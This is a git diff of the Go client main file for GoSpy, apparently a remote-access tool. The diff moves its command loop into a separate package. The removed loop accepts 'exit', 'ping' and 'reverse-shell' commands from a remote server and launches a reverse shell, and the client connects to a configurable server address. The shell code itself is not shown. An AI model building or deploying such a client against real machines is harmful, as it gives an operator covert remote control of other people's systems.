@@ -2,47 +2,11 @@ package main
 
 import (
 	"flag"
-	"github.com/psidex/GoSpy/internal/commands"
+	"github.com/psidex/GoSpy/internal/client"
 	"github.com/psidex/GoSpy/internal/comms"
 	"log"
 	"net"
-	"os"
 )
-
-// commandLoop is the loop that receives commands and executes them.
-// This should only return an err has occurred and it is impossible to continue as is (i.e. network dropped).
-func commandLoop(c comms.Connection) (err error) {
-	for {
-		var messageBytes []byte
-		messageBytes, err = c.RecvBytes()
-		if err != nil {
-			break
-		}
-
-		message := string(messageBytes)
-		log.Printf("Recv: %s", message)
-
-		switch message {
-
-		case "exit":
-			log.Println("Exiting")
-			os.Exit(0)
-
-		case "ping":
-			err = commands.PingReply(c)
-			if err != nil {
-				break
-			}
-
-		case "reverse-shell":
-			// Run in a goroutine so that it can abandoned by the client (e.g. if it hangs forever) and this loop will
-			// still respond.
-			go commands.ReverseShellReply(c)
-
-		}
-	}
-	return err
-}
 
 func main() {
 	address := flag.String("a", "127.0.0.1:12345", "the address (ip:port) of the gospyserver to connect to")
@@ -67,7 +31,7 @@ func main() {
 		}
 
 		log.Println("Successful connection")
-		err = commandLoop(c)
+		err = client.CommandLoop(c)
 		_ = c.Close()
 		log.Printf("Connection dropped: %s\n", err.Error())
 	}
